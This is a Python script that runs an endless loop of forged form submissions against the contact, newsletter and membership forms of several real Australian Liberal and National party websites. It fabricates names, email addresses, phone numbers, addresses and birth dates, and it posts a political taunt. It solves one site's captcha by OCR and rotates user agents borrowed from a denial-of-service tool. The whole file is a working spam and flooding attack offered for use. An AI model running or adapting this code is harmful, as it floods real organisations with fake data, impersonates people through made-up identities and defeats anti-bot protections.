                                                                                  # -- geoguit -- #
# libs-hit.py, created on the 9th of May, 2020
# Updated on the 22nd of June, 2020

# This module sends different packs of data (specified by the 'msg' variable) to Australian Liberal & National party websites.
# The NSW, Tasmania, and Victora Liberals use reCaptcha protection which we haven't programmed in yet, so that's too bad.
# Some sites like the Canberra and Federal branches of the Liberal party don't have an interactive "contact us" section, or they have Google reCaptcha,
# so instead the script targets their newsletter registrations.

# The user-agents.json is stolen from gkbrk's Python implementation of a Slow Loris DoS @ https://github.com/gkbrk/slowloris/blob/master/slowloris.py.

# P.S: If someone could think of a better way to handle random email address pattern generation that'd be rather helpful as the solution used in this script is a bit ugly.
                                                                                  # -- geoguit -- #

import io
import os
import re
import sys
import json
import string
import base64
import random
import requests
import pytesseract
from PIL import Image
from datetime import datetime, timedelta
from subprocess import check_output

def randomNum(stringLength):
    letters = string.digits
    return ''.join(random.choice(letters) for i in range(stringLength))

def is_allowed_specific_char(string): # This function checks if a string contains certain disallowed characters, which is used later since the captcha only uses alpha-numeric characters.
    charRe = re.compile(r'[^a-zA-Z0-9]')
    string = charRe.search(string)
    return not bool(string)

msg = 'Gladys Berejiklian killed all those Koalas.'
pytesseract.pytesseract.tesseract_cmd = 'C:\Program Files\Tesseract-OCR/tesseract.exe'

random.seed = (os.urandom(1024))
sites = json.loads(open('sites.json').read())
names = json.loads(open('first-names.json').read())
lastNames = json.loads(open('surnames.json').read())
user_agents = json.loads(open('user-agents.json').read())
states = ['ACT', 'NSW', 'NT', 'SA', 'TAS', 'VIC', 'WA', 'QLD']
roadTypes = ['street', 'st', 'cres', 'crescent', 'road', 'rd', 'bvd', 'boulevard', 'ave', 'avenue']

while True:
    #region National Party sites
    #region NSW National Party
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])  

    phone = '+6' + str(random.randint(1,3)) + randomNum(10)
    postCode = randomNum(4)
    s = requests.session()
    res = s.post('https://www.nswnationals.org.au/wp-admin/admin-ajax.php', allow_redirects=False, data={
        'action': 'nf_ajax_submit',
        'security': 'a5f9a551d7',
        'formData': '{"id":"1","fields":{"2":{"value":"' + uName + '","id":2},"3":{"value":"' + msg + '","id":3},"4":{"value":"","id":4},"334":{"value":"' + fName + '","id":334},"335":{"value":"' + lName + '","id":335},"336":{"value":"' + phone + '","id":336},"337":{"value":"' + postCode + '","id":337}},"settings":{"objectType":"Form Setting","editActive":true,"title":"Contact Me","key":"","created_at":"2018-10-31 14:28:14","default_label_pos":"above","conditions":[],"show_title":0,"clear_complete":"1","hide_complete":"1","wrapper_class":"","element_class":"","add_submit":"1","logged_in":"","not_logged_in_msg":"","sub_limit_number":"","sub_limit_msg":"","calculations":[],"container_styles_background-color":"","container_styles_border":"","container_styles_border-style":"","container_styles_border-color":"","container_styles_color":"","container_styles_height":"","container_styles_width":"","container_styles_font-size":"","container_styles_margin":"","container_styles_padding":"","container_styles_display":"","container_styles_float":"","container_styles_show_advanced_css":"0","container_styles_advanced":"","title_styles_background-color":"","title_styles_border":"","title_styles_border-style":"","title_styles_border-color":"","title_styles_color":"","title_styles_height":"","title_styles_width":"","title_styles_font-size":"","title_styles_margin":"","title_styles_padding":"","title_styles_display":"","title_styles_float":"","title_styles_show_advanced_css":"0","title_styles_advanced":"","row_styles_background-color":"","row_styles_border":"","row_styles_border-style":"","row_styles_border-color":"","row_styles_color":"","row_styles_height":"","row_styles_width":"","row_styles_font-size":"","row_styles_margin":"","row_styles_padding":"","row_styles_display":"","row_styles_show_advanced_css":"0","row_styles_advanced":"","row-odd_styles_background-color":"","row-odd_styles_border":"","row-odd_styles_border-style":"","row-odd_styles_border-color":"","row-odd_styles_color":"","row-odd_styles_height":"","row-odd_styles_width":"","row-odd_styles_font-size":"","row-odd_styles_margin":"","row-odd_styles_padding":"","row-odd_styles_display":"","row-odd_styles_show_advanced_css":"0","row-odd_styles_advanced":"","success-msg_styles_background-color":"","success-msg_styles_border":"","success-msg_styles_border-style":"","success-msg_styles_border-color":"","success-msg_styles_color":"","success-msg_styles_height":"","success-msg_styles_width":"","success-msg_styles_font-size":"","success-msg_styles_margin":"","success-msg_styles_padding":"","success-msg_styles_display":"","success-msg_styles_show_advanced_css":"0","success-msg_styles_advanced":"","error_msg_styles_background-color":"","error_msg_styles_border":"","error_msg_styles_border-style":"","error_msg_styles_border-color":"","error_msg_styles_color":"","error_msg_styles_height":"","error_msg_styles_width":"","error_msg_styles_font-size":"","error_msg_styles_margin":"","error_msg_styles_padding":"","error_msg_styles_display":"","error_msg_styles_show_advanced_css":"0","error_msg_styles_advanced":"","currency":"","unique_field_error":"A form with this value has already been submitted.","mp_breadcrumb":1,"mp_progress_bar":1,"mp_display_titles":0,"breadcrumb_container_styles_show_advanced_css":0,"breadcrumb_buttons_styles_show_advanced_css":0,"breadcrumb_button_hover_styles_show_advanced_css":0,"breadcrumb_active_button_styles_show_advanced_css":0,"progress_bar_container_styles_show_advanced_css":0,"progress_bar_fill_styles_show_advanced_css":0,"part_titles_styles_show_advanced_css":0,"navigation_container_styles_show_advanced_css":0,"previous_button_styles_show_advanced_css":0,"next_button_styles_show_advanced_css":0,"navigation_hover_styles_show_advanced_css":0,"drawerDisabled":false,"allow_public_link":0,"embed_form":"","ninjaForms":"Ninja Forms","changeEmailErrorMsg":"Please enter a valid email address!","changeDateErrorMsg":"Please enter a valid date!","confirmFieldErrorMsg":"These fields must match!","fieldNumberNumMinError":"Number Min Error","fieldNumberNumMaxError":"Number Max Error","fieldNumberIncrementBy":"Please increment by ","fieldTextareaRTEInsertLink":"Insert Link","fieldTextareaRTEInsertMedia":"Insert Media","fieldTextareaRTESelectAFile":"Select a file","formErrorsCorrectErrors":"Please correct errors before submitting this form.","formHoneypot":"If you are a human seeing this field, please leave it empty.","validateRequiredField":"This is a required field.","honeypotHoneypotError":"Honeypot Error","fileUploadOldCodeFileUploadInProgress":"File Upload in Progress.","fileUploadOldCodeFileUpload":"FILE UPLOAD","currencySymbol":"&#36;","fieldsMarkedRequired":"Fields marked with an <span class=\"ninja-forms-req-symbol\">*</span> are required","thousands_sep":",","decimal_point":".","siteLocale":"en_AU","dateFormat":"d/m/Y","startOfWeek":"1","of":"of","previousMonth":"Previous Month","nextMonth":"Next Month","months":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthsShort":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"weekdays":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"weekdaysShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"weekdaysMin":["Su","Mo","Tu","We","Th","Fr","Sa"],"currency_symbol":"","beforeForm":"","beforeFields":"","afterFields":"","afterForm":""},"extra":{}}'
    })
    print('[NSW National Party] Email: %s, phone: %s, post code: %s, got status code %s.' % (uName, phone, postCode, res.status_code))
    #endregion
    
    #region Federal National Party
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    s = requests.session()
    res = s.post('https://nationals.org.au/', allow_redirects=False, data={
        'input_6': fName,
        'input_8': lName,
        'input_5': uName,
        'input_3': 'Website Subscriber',
        'input_9': '',
        'is_submit_4': 1,
        'gform_submit': 4,
        'gform_unique_id': '',
        'state_4': 'WyJbXSIsIjNiMThiNjJiNzhmYTI0Yjk3YmEwOTIxZDkyMDUwNTg1Il0=',
        'gform_target_page_number_4': 0,
        'gform_source_page_number_4': 1,
        'gform_field_values': ''
    })
    print('[Federal National Party] Email: %s, got status code %s.' % (uName, res.status_code))

    postCode = randomNum(4)
    s = requests.session()
    res = s.post('https://nationals.org.au/centenary/', allow_redirects=False, data={
        'input_1': fName,
        'input_2': lName,
        'input_3': uName,
        'input_5': postCode,
        'input_4': 'Website Subscriber',
        'is_submit_12': 1,
        'gform_submit': 12,
        'gform_unique_id': '',
        'state_12': 'WyJbXSIsIjNiMThiNjJiNzhmYTI0Yjk3YmEwOTIxZDkyMDUwNTg1Il0=',
        'gform_target_page_number_12': 0,
        'gform_source_page_number_12': 1,
        'gform_field_values': ''
    })
    print('[Federal National Party (Centenary)] Post code: %s, got status code %s.' % (postCode, res.status_code))
    #endregion
    #endregion

    #region Liberal Party sites
    #region Northern Territory CLP
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    phone = '+6' + str(random.randint(1,3)) + randomNum(10)
    s = requests.session()
    res = s.post('https://www.countryliberal.org/ajax/apps/formSubmitAjax.php', allow_redirects=False, data={
        '_u209413799502065410[first]': fName,
        '_u209413799502065410[last]': lName,
        '_u943970894874121883': uName,
        '_u319684824361225293[number]': phone,
        '_u652111513617466959': msg,
        'wsite_subject': '',
        'form_version': 2,
        'wsite_approved': 'approved',
        'ucfid': 477023082516092686,
        'recaptcha_token': ''
    })
    print('[NT Country Liberal Party] Email: %s, phone: %s, got status code %s.' % (uName, phone, res.status_code))
    #endregion

    #region Western Australia Liberal Party
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    suburb = random.choice(lastNames)
    s = requests.session()
    res = s.post('https://www.waliberal.org.au/contact/', allow_redirects=False, data={
        'et_pb_contact_name_0': fName + '+' + lName,
        'et_pb_contact_email_0': uName,
        'et_pb_contact_suburb_0': suburb,
        'et_pb_contact_reason_0': 'General Enquiry',
        'et_pb_contact_message_0': msg,
        'et_pb_contactform_submit_0': 'et_contact_proccess',
        '_wpnonce-et-pb-contact-form-submitted-0': '18dea6adc4',
        '_wp_http_referer': '/contact/',
        'et_pb_contact_email_fields_0': '[{"field_id":"et_pb_contact_name_0","original_id":"name","required_mark":"required","field_type":"input","field_label":"Name *"},{"field_id":"et_pb_contact_email_0","original_id":"email","required_mark":"required","field_type":"email","field_label":"Email Address *"},{"field_id":"et_pb_contact_suburb_0","original_id":"suburb","required_mark":"required","field_type":"input","field_label":"Suburb *"},{"field_id":"et_pb_contact_mobile_0","original_id":"mobile","required_mark":"not_required","field_type":"input","field_label":"Mobile"},{"field_id":"et_pb_contact_landline_0","original_id":"landline","required_mark":"not_required","field_type":"input","field_label":"Home Phone"},{"field_id":"et_pb_contact_reason_0","original_id":"reason","required_mark":"required","field_type":"select","field_label":"Select the reason for your enquiry"},{"field_id":"et_pb_contact_message_0","original_id":"message","required_mark":"required","field_type":"text","field_label":"Your message... *"}]',
        'token': '03AGdBq24Y60DFM4zUBsUZAZFRg4AJ2hmaMEJ6Px8Fal_Yt2UpcDWiW9Yd1uIQu-x8kZHY3JSFF42GJwM8nt6dK2PH0Od6BMqkB8pHTBcA3sz-2JNKvxcVp-uxuxn-6IocX8kV3yMmCbxDPzQNyvoJjjXdEio3BfCxZnaIqvTovS8EsQk7MNxuETI7ETJspd01LuGpo9K3TKzFMxtWSoZT_kRo28YreK8Ojjnu16-XOCERPjLWCfbCy3Ta9WDjT0r9-wdLNUegeC6p3KXi375vIUJVVphomy2KcXTTqTAZScFEv-xhFH726lgvevF9sg-GsEBalTAucPrew9ey6vqj2WWO1o5fK3c1dBvfgmjlKgQbve5Zy35bJLigVokbT11XWAvAMI3Ub5Xm0GsF5d_iHmvneR9fjwWxmFeOmzB5iGFgJswhB3SUPLA'
    })
    print('[WA Liberal Party] Email: %s, suburb: %s, got status code %s.' % (uName, suburb, res.status_code))
    #endregion

    #region South Australia Liberal Party
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    road = randomNum(3) + ' ' + random.choice(lastNames) + ' ' + random.choice(roadTypes)
    s = requests.session()
    res = s.post('https://www.saliberal.org.au/forms/feedbacks', allow_redirects=False, data={
        'authenticity_token': 'G++Mtg76Pvy6a+SzQxyjRGae0Ce4ZLSbtxL2CXcTmfI=',
        'page_id': 2694,
        "return_to": "https://www.saliberal.org.au/contact",
        'feedback[content]': msg,
        'feedback[first_name]': fName,
        'feedback[last_name]': lName,
        'feedback[email]': uName,
        'feedback[email_opt_in]': [
            0,
            1
        ],
        'feedback[mobile_opt_in]': 0,
        'feedback[submitted_address]': road,
        'feedback[is_volunteer]': 0,
        'commit': 'Send Message',
        'authenticity_token': 'G++Mtg76Pvy6a+SzQxyjRGae0Ce4ZLSbtxL2CXcTmfI='
    })
    print('[SA Liberal Party] Email: %s, road: %s, got status code %s.' % (uName, road, res.status_code))
    #endregion

    #region Queensland LNP
    s = requests.session()
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    res = s.post('https://www.lnp.org.au/contact-us/', allow_redirects=False, data={
        'input_1.3': fName,
        'input_1.6': lName,
        'input_2': uName,
        'input_3': 'LNP HQ',
        'input_4': 'Message from the Public',
        'input_5': msg,
        'gform_ajax': 'form_id=48&title=&description=1&tabindex=0',
        'is_submit_48': 1,
        'gform_submit': 48,
        'state_48': 'WyJbXSIsIjRmNjIwMGUwNzVkMTZmZjQ5ZGFhNmY5MWE5MTNkNTQ1Il0=',
        'gform_target_page_number_48': 0,
        'gform_source_page_number_48': 1
    })
    print('[Queensland LNP] Email: %s, got status code %s.' % (uName, res.status_code))
    #endregion

    #region Federal Liberal Party
    s = requests.session()
    site = random.choice(sites)
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    res = s.post('https://www.liberal.org.au/', allow_redirects=False, data={
        'submitted[email_address]': uName,
        'submitted[postal_code]': msg,
        'submitted[mailchimp][mailchimp_signup]': 1,
        'details[page_num]': 1,
        'details[page_count]': 1,
        'details[finished]': 0,
        'form_build_id': 'form-_6ZRmKDX76ONY0OJwTgHD2Sk_9uBxW1uBF7UGERd-ss',
        'form_id': 'webform_client_form_85218',
        'op': 'Sign Up'
    },
    headers={
        'Referer': site
    })
    print('[Federal Liberal Party] Email: %s, referer: %s, got status code %s.' % (uName, site, res.status_code))
    #endregion

    #region Canberra Liberal Party
    timestamp = str((datetime.utcnow() - timedelta(hours=0, minutes=20) - datetime(1970,1,1)).total_seconds())[0:10]
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    agent = random.choice(user_agents)
    s = requests.session()
    res = s.post('https://canberraliberals.org.au/latest-news/?mailoptin-ajax=subscribe_to_email_list', allow_redirects=False, data={
        'optin_data[mo-name]': msg,
        'optin_data[mo-email]': uName,
        'optin_data[optin_uuid]': 'CBvFFyhAVC',
        'optin_data[optin_campaign_id]': '1',
        'optin_data[email]': uName,
        'optin_data[name]': msg,
        'optin_data[_mo_timestamp]': timestamp,
        'optin_data[user_agent]': agent,
        'optin_data[conversion_page]': 'https://canberraliberals.org.au/latest-news/'
    })
    
    print('[Canberra Liberal Party] Email: %s, timestamp: %s, got status code %s.' % (uName, timestamp, res.status_code))
    #endregion

    #region Young Liberal Party
    s = requests.session()
    io.open('ylcaptcha.png', 'wb').write((s.get('https://www.youngliberal.org.au/components/com_chronoforms/chrono_verification.php?imtype=1').content))
    check_output(['magick', '.\ylcaptcha.png', '-resample', '600', '.\ylcaptcha.png'])
    captcha = ''.join(pytesseract.image_to_string(Image.open('ylcaptcha.png')).split())

    if(is_allowed_specific_char(captcha) == False or len(captcha) != 5):
        continue

    rndName = random.choice(names)
    rndLastName = random.choice(lastNames)
    state = random.choice(states)

    ext = randomNum(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = rndName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 1):
        uName = rndName.lower() + '.' + rndLastName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 2):
        uName = rndName.lower() + ext + '.' + rndLastName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = rndName.lower() + '.' + rndLastName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    ph = '+61' + randomNum(10)

    month = str(random.randint(1, 12))
    day = str(random.randint(1, 28))
    if(len(month) == 1):
        month = '0' + month

    if(len(day) == 1):
        day = '0' + day

    response = s.post('https://www.youngliberal.org.au/join?chronoform=join&event=submit', allow_redirects=False, data={
        'firstname': rndName,
        'lastname': rndLastName,
        'email': uName,
        'phone': ph,
        'dob': str(random.randint(1962, 2003)) + '-' + month + '-' + day,
        'address': randomNum(2) + ' %s %s, %s, NSW' % (random.choice(lastNames), random.choice(['ave', 'st', 'rd', 'cres', 'avenue', 'street', 'road', 'cresent']), random.choice(lastNames)),
        'state': state,
        'reason': msg,
        'chrono_verification': captcha,
        'submit': 'Submit',
        '7e4dd2885529d34d7b71d4857c5b4bc4': '1'
    })

    if(response.status_code != 200):
        print('Received status code %s, exiting...' % (response.status_code))
        quit()

    print("[Young Liberal Party] Captcha: \"%s\", name: %s %s, email: %s, state: %s, got status code %s." % (captcha, rndName, rndLastName, uName, state, response.status_code))
    #endregion
    #endregion